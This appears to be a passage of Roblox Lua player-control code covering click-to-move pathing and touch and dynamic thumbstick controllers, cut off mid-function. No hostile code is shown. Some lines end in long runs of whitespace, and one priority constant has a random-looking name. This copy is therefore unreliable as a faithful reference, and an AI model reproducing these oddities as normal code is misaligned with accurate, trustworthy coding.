			if not this.AgentCanFollowPath then
				this.PathFailed:Fire()
				return
			end
	
			if this.Started then return end
			this.Started = true
	
			ClickToMoveDisplay.CancelFailureAnimation()
	
			if ShowPath then
				if overrideShowPath == nil or overrideShowPath then
					this.stopTraverseFunc, this.setPointFunc = ClickToMoveDisplay.CreatePathDisplay(this.pointList, this.OriginalTargetPoint)
				end
			end
	
			if #this.pointList > 0 then
				-- Determine the humanoid offset from the path's first point
				-- Offset of the first waypoint from the path's origin point
				this.HumanoidOffsetFromPath = Vector3.new(0, this.pointList[1].Position.Y - this.OriginPoint.Y, 0)
	
				-- As well as its current position and velocity
				this.CurrentHumanoidPosition = this.Humanoid.RootPart.Position + this.HumanoidOffsetFromPath
				this.CurrentHumanoidVelocity = this.Humanoid.RootPart.Velocity
	
				-- Connect to events
				this.SeatedConn = this.Humanoid.Seated:Connect(function(isSeated, seat) this:OnPathInterrupted() end)
				this.DiedConn = this.Humanoid.Died:Connect(function() this:OnPathInterrupted() end)
				this.TeleportedConn = this.Humanoid.RootPart:GetPropertyChangedSignal("CFrame"):Connect(function() this:OnPathInterrupted() end)
	
				-- Actually start
				this.CurrentPoint = 1 -- The first waypoint is always the start location. Skip it.
				this:OnPointReached(true) -- Move to first point
			else
				this.PathFailed:Fire()
				if this.stopTraverseFunc then
					this.stopTraverseFunc()
				end
			end
		end
	
		--We always raycast to the ground in the case that the user clicked a wall.
		local offsetPoint = this.TargetPoint + this.TargetSurfaceNormal*1.5
		local ray = Ray.new(offsetPoint, Vector3.new(0,-1,0)*50)
		local newHitPart, newHitPos = Workspace:FindPartOnRayWithIgnoreList(ray, getIgnoreList())
		if newHitPart then
			this.TargetPoint = newHitPos
		end
		this:ComputePath()
	
		return this
	end
	
	-------------------------------------------------------------------------
	
	local function CheckAlive()
		local humanoid = findPlayerHumanoid(Player)
		return humanoid ~= nil and humanoid.Health > 0
	end
	
	local function GetEquippedTool(character)
		if character ~= nil then
			for _, child in pairs(character:GetChildren()) do
				if child:IsA('Tool') then
					return child
				end
			end
		end
	end
	
	local ExistingPather = nil
	local ExistingIndicator = nil
	local PathCompleteListener = nil
	local PathFailedListener = nil
	
	local function CleanupPath()
		if ExistingPather then
			ExistingPather:Cancel()
			ExistingPather = nil
		end
		if PathCompleteListener then
			PathCompleteListener:Disconnect()
			PathCompleteListener = nil
		end
		if PathFailedListener then
			PathFailedListener:Disconnect()
			PathFailedListener = nil
		end
		if ExistingIndicator then
			ExistingIndicator:Destroy()
		end
	end
	
	local function HandleMoveTo(thisPather, hitPt, hitChar, character, overrideShowPath)
		if ExistingPather then
			CleanupPath()
		end
		ExistingPather = thisPather
		thisPather:Start(overrideShowPath)
	
		PathCompleteListener = thisPather.Finished.Event:Connect(function()
			CleanupPath()
			if hitChar then
				local currentWeapon = GetEquippedTool(character)
				if currentWeapon then
					currentWeapon:Activate()
				end
			end
		end)
		PathFailedListener = thisPather.PathFailed.Event:Connect(function()
			CleanupPath()
			if overrideShowPath == nil or overrideShowPath then
				local shouldPlayFailureAnim = PlayFailureAnimation and not (ExistingPather and ExistingPather:IsActive())
				if shouldPlayFailureAnim then
					ClickToMoveDisplay.PlayFailureAnimation()
				end
				ClickToMoveDisplay.DisplayFailureWaypoint(hitPt)
			end
		end)
	end
	
	local function ShowPathFailedFeedback(hitPt)
		if ExistingPather and ExistingPather:IsActive() then
			ExistingPather:Cancel()
		end
		if PlayFailureAnimation then
			ClickToMoveDisplay.PlayFailureAnimation()
		end
		ClickToMoveDisplay.DisplayFailureWaypoint(hitPt)
	end
	
	function OnTap(tapPositions, goToPoint, wasTouchTap)
		-- Good to remember if this is the latest tap event
		local camera = Workspace.CurrentCamera
		local character = Player.Character
	
		if not CheckAlive() then return end
	
		-- This is a path tap position
		if #tapPositions == 1 or goToPoint then
			if camera then
				local unitRay = camera:ScreenPointToRay(tapPositions[1].x, tapPositions[1].y)
				local ray = Ray.new(unitRay.Origin, unitRay.Direction*1000)
	
				local myHumanoid = findPlayerHumanoid(Player)
				local hitPart, hitPt, hitNormal = Utility.Raycast(ray, true, getIgnoreList())
	
				local hitChar, hitHumanoid = Utility.FindCharacterAncestor(hitPart)
				if wasTouchTap and hitHumanoid and StarterGui:GetCore("AvatarContextMenuEnabled") then
					local clickedPlayer = Players:GetPlayerFromCharacter(hitHumanoid.Parent)
					if clickedPlayer then
						CleanupPath()
						return                                                                                  
					end
				end
				if goToPoint then
					hitPt = goToPoint
					hitChar = nil
				end
				if hitPt and character then
					-- Clean up current path
					CleanupPath()
					local thisPather = Pather(hitPt, hitNormal)
					if thisPather:IsValidPath() then
						HandleMoveTo(thisPather, hitPt, hitChar, character)                                          
					else
						-- Clean up
						thisPather:Cleanup()
						-- Feedback here for when we don't have a good path
						ShowPathFailedFeedback(hitPt)
					end
				end
			end
		elseif #tapPositions >= 2 then
			if camera then
				-- Do shoot
				local currentWeapon = GetEquippedTool(character)                                                                                                
				if currentWeapon then
					currentWeapon:Activate()
				end
			end
		end
	end
	
	local function DisconnectEvent(event)
		if event then
			event:Disconnect()
		end
	end
	
	--[[ The ClickToMove Controller Class ]]--
	local KeyboardController = _Keyboard()
	local ClickToMove = setmetatable({}, KeyboardController)
	ClickToMove.__index = ClickToMove
	
	function ClickToMove.new(CONTROL_ACTION_PRIORITY)
		local self = setmetatable(KeyboardController.new(CONTROL_ACTION_PRIORITY), ClickToMove)
	
		self.fingerTouches = {}
		self.numUnsunkTouches = 0
		-- PC simulation
		self.mouse1Down = tick()
		self.mouse1DownPos = Vector2.new()
		self.mouse2DownTime = tick()
		self.mouse2DownPos = Vector2.new()
		self.mouse2UpTime = tick()
	
		self.keyboardMoveVector = ZERO_VECTOR3
	
		self.tapConn = nil
		self.inputBeganConn = nil
		self.inputChangedConn = nil
		self.inputEndedConn = nil
		self.humanoidDiedConn = nil
		self.characterChildAddedConn = nil
		self.onCharacterAddedConn = nil
		self.characterChildRemovedConn = nil
		self.renderSteppedConn = nil
		self.menuOpenedConnection = nil
	
		self.running = false
	
		self.wasdEnabled = false
	
		return self
	end
	
	function ClickToMove:DisconnectEvents()
		DisconnectEvent(self.tapConn)
		DisconnectEvent(self.inputBeganConn)
		DisconnectEvent(self.inputChangedConn)
		DisconnectEvent(self.inputEndedConn)
		DisconnectEvent(self.humanoidDiedConn)
		DisconnectEvent(self.characterChildAddedConn)
		DisconnectEvent(self.onCharacterAddedConn)
		DisconnectEvent(self.renderSteppedConn)
		DisconnectEvent(self.characterChildRemovedConn)
		DisconnectEvent(self.menuOpenedConnection)
	end
	
	function ClickToMove:OnTouchBegan(input, processed)
		if self.fingerTouches[input] == nil and not processed then
			self.numUnsunkTouches = self.numUnsunkTouches + 1
		end
		self.fingerTouches[input] = processed
	end
	
	function ClickToMove:OnTouchChanged(input, processed)
		if self.fingerTouches[input] == nil then
			self.fingerTouches[input] = processed
			if not processed then
				self.numUnsunkTouches = self.numUnsunkTouches + 1
			end
		end
	end
	
	function ClickToMove:OnTouchEnded(input, processed)
		if self.fingerTouches[input] ~= nil and self.fingerTouches[input] == false then
			self.numUnsunkTouches = self.numUnsunkTouches - 1
		end
		self.fingerTouches[input] = nil
	end
	
	
	function ClickToMove:OnCharacterAdded(character)
		self:DisconnectEvents()
	
		self.inputBeganConn = UserInputService.InputBegan:Connect(function(input, processed)
			if input.UserInputType == Enum.UserInputType.Touch then
				self:OnTouchBegan(input, processed)
			end
	
			-- Cancel path when you use the keyboard controls if wasd is enabled.
			if self.wasdEnabled and processed == false and input.UserInputType == Enum.UserInputType.Keyboard
				and movementKeys[input.KeyCode] then
				CleanupPath()
				ClickToMoveDisplay.CancelFailureAnimation()
			end
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				self.mouse1DownTime = tick()
				self.mouse1DownPos = input.Position
			end
			if input.UserInputType == Enum.UserInputType.MouseButton2 then
				self.mouse2DownTime = tick()
				self.mouse2DownPos = input.Position
			end
		end)
	
		self.inputChangedConn = UserInputService.InputChanged:Connect(function(input, processed)
			if input.UserInputType == Enum.UserInputType.Touch then
				self:OnTouchChanged(input, processed)
			end
		end)
	
		self.inputEndedConn = UserInputService.InputEnded:Connect(function(input, processed)
			if input.UserInputType == Enum.UserInputType.Touch then
				self:OnTouchEnded(input, processed)
			end
	
			if input.UserInputType == Enum.UserInputType.MouseButton2 then
				self.mouse2UpTime = tick()
				local currPos = input.Position
				-- We allow click to move during path following or if there is no keyboard movement
				local allowed = ExistingPather or self.keyboardMoveVector.Magnitude <= 0
				if self.mouse2UpTime - self.mouse2DownTime < 0.25 and (currPos - self.mouse2DownPos).magnitude < 5 and allowed then
					local positions = {currPos}
					OnTap(positions)
				end
			end
		end)
	
		self.tapConn = UserInputService.TouchTap:Connect(function(touchPositions, processed)
			if not processed then
				OnTap(touchPositions, nil, true)
			end
		end)
	
		self.menuOpenedConnection = GuiService.MenuOpened:Connect(function()
			CleanupPath()
		end)
	
		local function OnCharacterChildAdded(child)
			if UserInputService.TouchEnabled then
				if child:IsA('Tool') then
					child.ManualActivationOnly = true
				end
			end
			if child:IsA('Humanoid') then
				DisconnectEvent(self.humanoidDiedConn)
				self.humanoidDiedConn = child.Died:Connect(function()
					if ExistingIndicator then
						DebrisService:AddItem(ExistingIndicator.Model, 1)
					end
				end)
			end
		end
	
		self.characterChildAddedConn = character.ChildAdded:Connect(function(child)
			OnCharacterChildAdded(child)
		end)
		self.characterChildRemovedConn = character.ChildRemoved:Connect(function(child)
			if UserInputService.TouchEnabled then
				if child:IsA('Tool') then
					child.ManualActivationOnly = false
				end
			end
		end)
		for _, child in pairs(character:GetChildren()) do
			OnCharacterChildAdded(child)
		end
	end
	
	function ClickToMove:Start()
		self:Enable(true)
	end
	
	function ClickToMove:Stop()
		self:Enable(false)
	end
	
	function ClickToMove:CleanupPath()
		CleanupPath()
	end
	
	function ClickToMove:Enable(enable, enableWASD, touchJumpController)
		if enable then
			if not self.running then
				if Player.Character then -- retro-listen
					self:OnCharacterAdded(Player.Character)
				end
				self.onCharacterAddedConn = Player.CharacterAdded:Connect(function(char)
					self:OnCharacterAdded(char)
				end)
				self.running = true
			end
			self.touchJumpController = touchJumpController
			if self.touchJumpController then
				self.touchJumpController:Enable(self.jumpEnabled)
			end
		else
			if self.running then
				self:DisconnectEvents()
				CleanupPath()
				-- Restore tool activation on shutdown
				if UserInputService.TouchEnabled then
					local character = Player.Character
					if character then
						for _, child in pairs(character:GetChildren()) do
							if child:IsA('Tool') then
								child.ManualActivationOnly = false
							end
						end
					end
				end
				self.running = false
			end
			if self.touchJumpController and not self.jumpEnabled then
				self.touchJumpController:Enable(true)
			end
			self.touchJumpController = nil
		end
	
		-- Extension for initializing Keyboard input as this class now derives from Keyboard
		if UserInputService.KeyboardEnabled and enable ~= self.enabled then
	
			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0
	
			self.moveVector = ZERO_VECTOR3
	
			if enable then
				self:BindContextActions()
				self:ConnectFocusEventListeners()
			else
				self:UnbindContextActions()
				self:DisconnectFocusEventListeners()
			end
		end
	
		self.wasdEnabled = enable and enableWASD or false
		self.enabled = enable
	end
	
	function ClickToMove:OnRenderStepped(dt)
		-- Reset jump
		self.isJumping = false
	
		-- Handle Pather
		if ExistingPather then
			-- Let the Pather update
			ExistingPather:OnRenderStepped(dt)
	
			-- If we still have a Pather, set the resulting actions
			if ExistingPather then
				-- Setup move (NOT relative to camera)
				self.moveVector = ExistingPather.NextActionMoveDirection
				self.moveVectorIsCameraRelative = false
	
				-- Setup jump (but do NOT prevent the base Keayboard class from requesting jumps as well)
				if ExistingPather.NextActionJump then
					self.isJumping = true
				end
			else
				self.moveVector = self.keyboardMoveVector
				self.moveVectorIsCameraRelative = true
			end
		else
			self.moveVector = self.keyboardMoveVector
			self.moveVectorIsCameraRelative = true
		end
	
		-- Handle Keyboard's jump
		if self.jumpRequested then
			self.isJumping = true
		end
	end
	
	-- Overrides Keyboard:UpdateMovement(inputState) to conditionally consider self.wasdEnabled and let OnRenderStepped handle the movement
	function ClickToMove:UpdateMovement(inputState)
		if inputState == Enum.UserInputState.Cancel then
			self.keyboardMoveVector = ZERO_VECTOR3
		elseif self.wasdEnabled then
			self.keyboardMoveVector = Vector3.new(self.leftValue + self.rightValue, 0, self.forwardValue + self.backwardValue)
		end
	end
	
	-- Overrides Keyboard:UpdateJump() because jump is handled in OnRenderStepped
	function ClickToMove:UpdateJump()
		-- Nothing to do (handled in OnRenderStepped)
	end
	
	--Public developer facing functions
	function ClickToMove:SetShowPath(value)
		ShowPath = value
	end
	
	function ClickToMove:GetShowPath()
		return ShowPath
	end
	
	function ClickToMove:SetWaypointTexture(texture)
		ClickToMoveDisplay.SetWaypointTexture(texture)
	end
	
	function ClickToMove:GetWaypointTexture()
		return ClickToMoveDisplay.GetWaypointTexture()
	end
	
	function ClickToMove:SetWaypointRadius(radius)
		ClickToMoveDisplay.SetWaypointRadius(radius)
	end
	
	function ClickToMove:GetWaypointRadius()
		return ClickToMoveDisplay.GetWaypointRadius()
	end
	
	function ClickToMove:SetEndWaypointTexture(texture)
		ClickToMoveDisplay.SetEndWaypointTexture(texture)
	end
	
	function ClickToMove:GetEndWaypointTexture()
		return ClickToMoveDisplay.GetEndWaypointTexture()
	end
	
	function ClickToMove:SetWaypointsAlwaysOnTop(alwaysOnTop)
		ClickToMoveDisplay.SetWaypointsAlwaysOnTop(alwaysOnTop)
	end
	
	function ClickToMove:GetWaypointsAlwaysOnTop()
		return ClickToMoveDisplay.GetWaypointsAlwaysOnTop()
	end
	
	function ClickToMove:SetFailureAnimationEnabled(enabled)
		PlayFailureAnimation = enabled
	end
	
	function ClickToMove:GetFailureAnimationEnabled()
		return PlayFailureAnimation
	end
	
	function ClickToMove:SetIgnoredPartsTag(tag)
		UpdateIgnoreTag(tag)
	end
	
	function ClickToMove:GetIgnoredPartsTag()
		return CurrentIgnoreTag
	end
	
	function ClickToMove:SetUseDirectPath(directPath)
		UseDirectPath = directPath
	end
	
	function ClickToMove:GetUseDirectPath()
		return UseDirectPath
	end
	
	function ClickToMove:SetAgentSizeIncreaseFactor(increaseFactorPercent)
		AgentSizeIncreaseFactor = 1.0 + (increaseFactorPercent / 100.0)
	end
	
	function ClickToMove:GetAgentSizeIncreaseFactor()
		return (AgentSizeIncreaseFactor - 1.0) * 100.0
	end
	
	function ClickToMove:SetUnreachableWaypointTimeout(timeoutInSec)
		UnreachableWaypointTimeout = timeoutInSec
	end
	
	function ClickToMove:GetUnreachableWaypointTimeout()
		return UnreachableWaypointTimeout
	end
	
	function ClickToMove:SetUserJumpEnabled(jumpEnabled)
		self.jumpEnabled = jumpEnabled
		if self.touchJumpController then
			self.touchJumpController:Enable(jumpEnabled)
		end
	end
	
	function ClickToMove:GetUserJumpEnabled()
		return self.jumpEnabled
	end
	
	function ClickToMove:MoveTo(position, showPath, useDirectPath)
		local character = Player.Character
		if character == nil then
			return false
		end
		local thisPather = Pather(position, Vector3.new(0, 1, 0), useDirectPath)
		if thisPather and thisPather:IsValidPath() then
			HandleMoveTo(thisPather, position, nil, character, showPath)
			return true
		end
		return false
	end
	
	return ClickToMove
end

function _TouchThumbstick()
	local Players = game:GetService("Players")
	local GuiService = game:GetService("GuiService")
	local UserInputService = game:GetService("UserInputService")
	--[[ Constants ]]--
	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	local TOUCH_CONTROL_SHEET = "rbxasset://textures/ui/TouchControlsSheet.png"
	--[[ The Module ]]--
	local BaseCharacterController = _BaseCharacterController()
	local TouchThumbstick = setmetatable({}, BaseCharacterController)
	TouchThumbstick.__index = TouchThumbstick
	function TouchThumbstick.new()
		local self = setmetatable(BaseCharacterController.new(), TouchThumbstick)
		
		self.isFollowStick = false
		
		self.thumbstickFrame = nil
		self.moveTouchObject = nil
		self.onTouchMovedConn = nil
		self.onTouchEndedConn = nil
		self.screenPos = nil
		self.stickImage = nil
		self.thumbstickSize = nil -- Float
		
		return self
	end
	function TouchThumbstick:Enable(enable, uiParentFrame)
		if enable == nil then return false end			-- If nil, return false (invalid argument)
		enable = enable and true or false				-- Force anything non-nil to boolean before comparison
		if self.enabled == enable then return true end	-- If no state change, return true indicating already in requested state
		
		self.moveVector = ZERO_VECTOR3
		self.isJumping = false
		
		if enable then
			-- Enable
			if not self.thumbstickFrame then
				self:Create(uiParentFrame)
			end
			self.thumbstickFrame.Visible = true
		else 
			-- Disable
			self.thumbstickFrame.Visible = false
			self:OnInputEnded()
		end
		self.enabled = enable
	end
	function TouchThumbstick:OnInputEnded()
		self.thumbstickFrame.Position = self.screenPos
		self.stickImage.Position = UDim2.new(0, self.thumbstickFrame.Size.X.Offset/2 - self.thumbstickSize/4, 0, self.thumbstickFrame.Size.Y.Offset/2 - self.thumbstickSize/4)
		
		self.moveVector = ZERO_VECTOR3
		self.isJumping = false
		self.thumbstickFrame.Position = self.screenPos
		self.moveTouchObject = nil
	end
	function TouchThumbstick:Create(parentFrame)
		
		if self.thumbstickFrame then
			self.thumbstickFrame:Destroy()
			self.thumbstickFrame = nil
			if self.onTouchMovedConn then
				self.onTouchMovedConn:Disconnect()
				self.onTouchMovedConn = nil
			end
			if self.onTouchEndedConn then
				self.onTouchEndedConn:Disconnect()
				self.onTouchEndedConn = nil
			end
		end
		
		local minAxis = math.min(parentFrame.AbsoluteSize.x, parentFrame.AbsoluteSize.y)
		local isSmallScreen = minAxis <= 500
		self.thumbstickSize = isSmallScreen and 70 or 120
		self.screenPos = isSmallScreen and UDim2.new(0, (self.thumbstickSize/2) - 10, 1, -self.thumbstickSize - 20) or
			UDim2.new(0, self.thumbstickSize/2, 1, -self.thumbstickSize * 1.75)
			
		self.thumbstickFrame = Instance.new("Frame")
		self.thumbstickFrame.Name = "ThumbstickFrame"
		self.thumbstickFrame.Active = true
		self.thumbstickFrame.Visible = false
		self.thumbstickFrame.Size = UDim2.new(0, self.thumbstickSize, 0, self.thumbstickSize)
		self.thumbstickFrame.Position = self.screenPos
		self.thumbstickFrame.BackgroundTransparency = 1
		
		local outerImage = Instance.new("ImageLabel")
		outerImage.Name = "OuterImage"
		outerImage.Image = TOUCH_CONTROL_SHEET
		outerImage.ImageRectOffset = Vector2.new()
		outerImage.ImageRectSize = Vector2.new(220, 220)
		outerImage.BackgroundTransparency = 1
		outerImage.Size = UDim2.new(0, self.thumbstickSize, 0, self.thumbstickSize)
		outerImage.Position = UDim2.new(0, 0, 0, 0)
		outerImage.Parent = self.thumbstickFrame
		
		self.stickImage = Instance.new("ImageLabel")
		self.stickImage.Name = "StickImage"
		self.stickImage.Image = TOUCH_CONTROL_SHEET
		self.stickImage.ImageRectOffset = Vector2.new(220, 0)
		self.stickImage.ImageRectSize = Vector2.new(111, 111)
		self.stickImage.BackgroundTransparency = 1
		self.stickImage.Size = UDim2.new(0, self.thumbstickSize/2, 0, self.thumbstickSize/2)
		self.stickImage.Position = UDim2.new(0, self.thumbstickSize/2 - self.thumbstickSize/4, 0, self.thumbstickSize/2 - self.thumbstickSize/4)
		self.stickImage.ZIndex = 2
		self.stickImage.Parent = self.thumbstickFrame
		
		local centerPosition = nil
		local deadZone = 0.05
		
		local function DoMove(direction)
			
			local currentMoveVector = direction / (self.thumbstickSize/2)
			
			-- Scaled Radial Dead Zone
			local inputAxisMagnitude = currentMoveVector.magnitude
			if inputAxisMagnitude < deadZone then
				currentMoveVector = Vector3.new()
			else
				currentMoveVector = currentMoveVector.unit * ((inputAxisMagnitude - deadZone) / (1 - deadZone))
				-- NOTE: Making currentMoveVector a unit vector will cause the player to instantly go max speed
				-- must check for zero length vector is using unit
				currentMoveVector = Vector3.new(currentMoveVector.x, 0, currentMoveVector.y)
			end
			
			self.moveVector = currentMoveVector
		end
		
		local function MoveStick(pos)
			local relativePosition = Vector2.new(pos.x - centerPosition.x, pos.y - centerPosition.y)
			local length = relativePosition.magnitude
			local maxLength = self.thumbstickFrame.AbsoluteSize.x/2
			if self.isFollowStick and length > maxLength then
				local offset = relativePosition.unit * maxLength
				self.thumbstickFrame.Position = UDim2.new(
					0, pos.x - self.thumbstickFrame.AbsoluteSize.x/2 - offset.x,
					0, pos.y - self.thumbstickFrame.AbsoluteSize.y/2 - offset.y)
			else
				length = math.min(length, maxLength)
				relativePosition = relativePosition.unit * length
			end
			self.stickImage.Position = UDim2.new(0, relativePosition.x + self.stickImage.AbsoluteSize.x/2, 0, relativePosition.y + self.stickImage.AbsoluteSize.y/2)
		end
		
		-- input connections
		self.thumbstickFrame.InputBegan:Connect(function(inputObject)
			--A touch that starts elsewhere on the screen will be sent to a frame's InputBegan event
			--if it moves over the frame. So we check that this is actually a new touch (inputObject.UserInputState ~= Enum.UserInputState.Begin)
			if self.moveTouchObject or inputObject.UserInputType ~= Enum.UserInputType.Touch
				or inputObject.UserInputState ~= Enum.UserInputState.Begin then
				return
			end
			
			self.moveTouchObject = inputObject
			self.thumbstickFrame.Position = UDim2.new(0, inputObject.Position.x - self.thumbstickFrame.Size.X.Offset/2, 0, inputObject.Position.y - self.thumbstickFrame.Size.Y.Offset/2)
			centerPosition = Vector2.new(self.thumbstickFrame.AbsolutePosition.x + self.thumbstickFrame.AbsoluteSize.x/2,
				self.thumbstickFrame.AbsolutePosition.y + self.thumbstickFrame.AbsoluteSize.y/2)
			local direction = Vector2.new(inputObject.Position.x - centerPosition.x, inputObject.Position.y - centerPosition.y)
		end)
		
		self.onTouchMovedConn = UserInputService.TouchMoved:Connect(function(inputObject, isProcessed)
			if inputObject == self.moveTouchObject then
				centerPosition = Vector2.new(self.thumbstickFrame.AbsolutePosition.x + self.thumbstickFrame.AbsoluteSize.x/2,
					self.thumbstickFrame.AbsolutePosition.y + self.thumbstickFrame.AbsoluteSize.y/2)
				local direction = Vector2.new(inputObject.Position.x - centerPosition.x, inputObject.Position.y - centerPosition.y)
				DoMove(direction)
				MoveStick(inputObject.Position)
			end
		end)
		
		self.onTouchEndedConn = UserInputService.TouchEnded:Connect(function(inputObject, isProcessed)
			if inputObject == self.moveTouchObject then
				self:OnInputEnded()
			end
		end)
		
		GuiService.MenuOpened:Connect(function()
			if self.moveTouchObject then
				self:OnInputEnded()
			end
		end)	
		
		self.thumbstickFrame.Parent = parentFrame
	end
	return TouchThumbstick
end

function _DynamicThumbstick()
	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	local TOUCH_CONTROLS_SHEET = "rbxasset://textures/ui/Input/TouchControlsSheetV2.png"
	
	local DYNAMIC_THUMBSTICK_ACTION_NAME = "DynamicThumbstickAction"
	local DE1aWk5C9Eo5cPj5dhmsiVQNwrb61yyFbn = Enum.ContextActionPriority.High.Value
	
	local MIDDLE_TRANSPARENCIES = {
		1 - 0.89,
		1 - 0.70,
		1 - 0.60,
		1 - 0.50,
		1 - 0.40,
		1 - 0.30,
		1 - 0.25
	}
	local NUM_MIDDLE_IMAGES = #MIDDLE_TRANSPARENCIES
	
	local FADE_IN_OUT_BACKGROUND = true
	local FADE_IN_OUT_MAX_ALPHA = 0.35
	
	local FADE_IN_OUT_HALF_DURATION_DEFAULT = 0.3
	local FADE_IN_OUT_BALANCE_DEFAULT = 0.5
	local ThumbstickFadeTweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	
	local Players = game:GetService("Players")
	local GuiService = game:GetService("GuiService")
	local UserInputService = game:GetService("UserInputService")
	local ContextActionService = game:GetService("ContextActionService")
	local RunService = game:GetService("RunService")
	local TweenService = game:GetService("TweenService")
	
	local LocalPlayer = Players.LocalPlayer
	if not LocalPlayer then
		Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
		LocalPlayer = Players.LocalPlayer
	end
	
	--[[ The Module ]]--
	local BaseCharacterController = _BaseCharacterController()
	local DynamicThumbstick = setmetatable({}, BaseCharacterController)
	DynamicThumbstick.__index = DynamicThumbstick
	
	function DynamicThumbstick.new()
		local self = setmetatable(BaseCharacterController.new(), DynamicThumbstick)
	
		self.moveTouchObject = nil
		self.moveTouchLockedIn = false
		self.moveTouchFirstChanged = false
		self.moveTouchStartPosition = nil
	
		self.startImage = nil
		self.endImage = nil
		self.middleImages = {}
	
		self.startImageFadeTween = nil
		self.endImageFadeTween = nil
		self.middleImageFadeTweens = {}
	
		self.isFirstTouch = true
	
		self.thumbstickFrame = nil
	
		self.onRenderSteppedConn = nil
	
		self.fadeInAndOutBalance = FADE_IN_OUT_BALANCE_DEFAULT
		self.fadeInAndOutHalfDuration = FADE_IN_OUT_HALF_DURATION_DEFAULT
		self.hasFadedBackgroundInPortrait = false
		self.hasFadedBackgroundInLandscape = false
	
		self.tweenInAlphaStart = nil
		self.tweenOutAlphaStart = nil
	
		return self
	end
	
	-- Note: Overrides base class GetIsJumping with get-and-clear behavior to do a single jump
	-- rather than sustained jumping. This is only to preserve the current behavior through the refactor.
	function DynamicThumbstick:GetIsJumping()
		local wasJumping = self.isJumping
		self.isJumping = false
		return wasJumping
	end
	
	function DynamicThumbstick:Enable(enable, uiParentFrame)
		if enable == nil then return false end			-- If nil, return false (invalid argument)
		enable = enable and true or false				-- Force anything non-nil to boolean before comparison
		if self.enabled == enable then return true end	-- If no state change, return true indicating already in requested state
	
		if enable then
			-- Enable
			if not self.thumbstickFrame then
				self:Create(uiParentFrame)
			end
	
			self:BindContextActions()
		else
			ContextActionService:UnbindAction(DYNAMIC_THUMBSTICK_ACTION_NAME)
			-- Disable
			self:OnInputEnded() -- Cleanup
		end
	
		self.enabled = enable
		self.thumbstickFrame.Visible = enable
	end
	
	-- Was called OnMoveTouchEnded in previous version
	function DynamicThumbstick:OnInputEnded()
		self.moveTouchObject = nil
		self.moveVector = ZERO_VECTOR3
		self:FadeThumbstick(false)
	end
	
	function DynamicThumbstick:FadeThumbstick(visible)
		if not visible and self.moveTouchObject then
			return
		end
		if self.isFirstTouch then return end
	
		if self.startImageFadeTween then
			self.startImageFadeTween:Cancel()
		end
		if self.endImageFadeTween then
			self.endImageFadeTween:Cancel()
		end
		for i = 1, #self.middleImages do
			if self.middleImageFadeTweens[i] then
				self.middleImageFadeTweens[i]:Cancel()
			end
		end
	
		if visible then
			self.startImageFadeTween = TweenService:Create(self.startImage, ThumbstickFadeTweenInfo, { ImageTransparency = 0 })
			self.startImageFadeTween:Play()
	
			self.endImageFadeTween = TweenService:Create(self.endImage, ThumbstickFadeTweenInfo, { ImageTransparency = 0.2 })
			self.endImageFadeTween:Play()
	
			for i = 1, #self.middleImages do
				self.middleImageFadeTweens[i] = TweenService:Create(self.middleImages[i], ThumbstickFadeTweenInfo, { ImageTransparency = MIDDLE_TRANSPARENCIES[i] })
				self.middleImageFadeTweens[i]:Play()
			end
		else
			self.startImageFadeTween = TweenService:Create(self.startImage, ThumbstickFadeTweenInfo, { ImageTransparency = 1 })
			self.startImageFadeTween:Play()
	
			self.endImageFadeTween = TweenService:Create(self.endImage, ThumbstickFadeTweenInfo, { ImageTransparency = 1 })
			self.endImageFadeTween:Play()
	
			for i = 1, #self.middleImages do
				self.middleImageFadeTweens[i] = TweenService:Create(self.middleImages[i], ThumbstickFadeTweenInfo, { ImageTransparency = 1 })
				self.middleImageFadeTweens[i]:Play()
			end
		end
	end
	
	function DynamicThumbstick:FadeThumbstickFrame(fadeDuration, fadeRatio)
		self.fadeInAndOutHalfDuration = fadeDuration * 0.5
		self.fadeInAndOutBalance = fadeRatio
		self.tweenInAlphaStart = tick()
	end
	
	function DynamicThumbstick:InputInFrame(inputObject)
		local frameCornerTopLeft = self.thumbstickFrame.AbsolutePosition
		local frameCornerBottomRight = frameCornerTopLeft + self.thumbstickFrame.AbsoluteSize
		local inputPosition = inputObject.Position
		if inputPosition.X >= frameCornerTopLeft.X and inputPosition.Y >= frameCornerTopLeft.Y then
			if inputPosition.X <= frameCornerBottomRight.X and inputPosition.Y <= frameCornerBottomRight.Y then
				return true
			end
		end
		return false
	end
	
	function DynamicThumbstick:DoFadeInBackground()
		local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
		local hasFadedBackgroundInOrientation = false
	
		-- only fade in/out the background once per orientation
		if playerGui then
			if playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeLeft or
				playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeRight then
					hasFadedBackgroundInOrientation = self.hasFadedBackgroundInLandscape
					self.hasFadedBackgroundInLandscape = true
			elseif playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.Portrait then
					hasFadedBackgroundInOrientation = self.hasFadedBackgroundInPortrait
					self.hasFadedBackgroundInPortrait = true
			end
		end
	
		if not hasFadedBackgroundInOrientation then
			self.fadeInAndOutHalfDuration = FADE_IN_OUT_HALF_DURATION_DEFAULT
			self.fadeInAndOutBalance = FADE_IN_OUT_BALANCE_DEFAULT
			self.tweenInAlphaStart = tick()
		end
	end
	
	function DynamicThumbstick:DoMove(direction)
		local currentMoveVector = direction
	
		-- Scaled Radial Dead Zone
		local inputAxisMagnitude = currentMoveVector.magnitude
		if inputAxisMagnitude < self.radiusOfDeadZone then
			currentMoveVector = ZERO_VECTOR3
		else
			currentMoveVector = currentMoveVector.unit*(
				1 - math.max(0, (self.radiusOfMaxSpeed - currentMoveVector.magnitude)/self.radiusOfMaxSpeed)
			)
			currentMoveVector = Vector3.new(currentMoveVector.x, 0, currentMoveVector.y)
		end
	
		self.moveVector = currentMoveVector
	end
	
	
	function DynamicThumbstick:LayoutMiddleImages(startPos, endPos)
		local startDist = (self.thumbstickSize / 2) + self.middleSize
		local vector = endPos - startPos
		local distAvailable = vector.magnitude - (self.thumbstickRingSize / 2) - self.middleSize
		local direction = vector.unit
	
		local distNeeded = self.middleSpacing * NUM_MIDDLE_IMAGES
		local spacing = self.middleSpacing
	
		if distNeeded < distAvailable then
